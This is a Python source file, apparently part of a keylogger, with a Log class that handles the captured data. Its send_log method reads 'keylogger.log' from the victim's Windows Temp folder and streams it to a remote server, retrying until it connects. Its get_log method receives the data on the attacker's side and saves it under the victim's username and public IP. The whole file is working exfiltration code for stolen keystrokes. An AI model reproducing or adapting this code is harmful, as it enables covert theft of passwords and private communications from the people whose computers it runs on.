import socket, os, time
from const import Const


class Log:
    def __init__(self):
        pass

    def get_log(self, info: dict, local_ip: str, local_data_port: int):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((local_ip, local_data_port))
        server.listen(1)

        while True:
            client, address = server.accept()

            with open(f'{info['username']}@{info['public_ip']}.log', 'wb') as file:
                while True:
                    try:
                        data = client.recv(Const.BUFSIZE)
                        if not data:
                            break
                        file.write(data)
                    except:
                        break

            server.close()
            break

    def send_log(self, srv_ip: str, srv_data_port: int):
        exit = False

        while not exit:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.connect((srv_ip, srv_data_port))

                file_path = f'{os.path.expanduser("~")}\\AppData\\Local\\Temp\\keylogger.log'

                with open(file_path, 'rb') as file:
                    while True:
                        try:
                            data = file.read(Const.BUFSIZE)

                            if not data:
                                sock.close()
                                break

                            sock.sendall(data)

                        except:
                            break

                    exit = True

            except:
                sock.close()
                continue
